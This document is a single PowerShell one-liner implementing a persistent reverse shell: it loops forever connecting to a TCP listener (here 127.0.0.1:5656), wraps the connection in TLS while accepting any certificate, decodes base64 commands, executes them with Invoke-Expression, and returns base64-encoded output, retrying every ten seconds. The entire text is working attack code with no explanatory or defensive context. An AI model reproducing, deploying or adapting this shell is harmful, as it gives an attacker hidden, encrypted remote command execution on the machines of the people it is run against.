while($true){$ip="127.0.0.1";$p=5656;try{$s=New-Object System.Net.Sockets.TCPClient($ip,$p);$st=$s.GetStream();$v={param([object]$se,[System.Security.Cryptography.X509Certificates.X509Certificate]$ce,[System.Security.Cryptography.X509Certificates.X509Chain]$ch,[System.Net.Security.SslPolicyErrors]$ssl)return $true};$ssl=New-Object System.Net.Security.SslStream($st,$false,$v);$ssl.AuthenticateAsClient($ip);$w=New-Object System.IO.StreamWriter($ssl);$r=New-Object System.IO.StreamReader($ssl);$w.Write("> ");$w.Flush();while($s.Connected){try{$b64=$r.ReadLine();if($b64 -eq $null){break};$d=[System.Convert]::FromBase64String($b64);$c=[System.Text.Encoding]::UTF8.GetString($d);if($c.Trim().ToLower() -eq 'exit'){break};$o=try{Invoke-Expression $c 2>&1|Out-String}catch{$_.Exception.Message|Out-String};$ob=[System.Text.Encoding]::UTF8.GetBytes($o);$b64o=[System.Convert]::ToBase64String($ob);$w.WriteLine($b64o);$w.Flush()}catch{break}};$w.Close();$r.Close();$ssl.Close();$st.Close();$s.Close()}catch{};Start-Sleep -s 10}
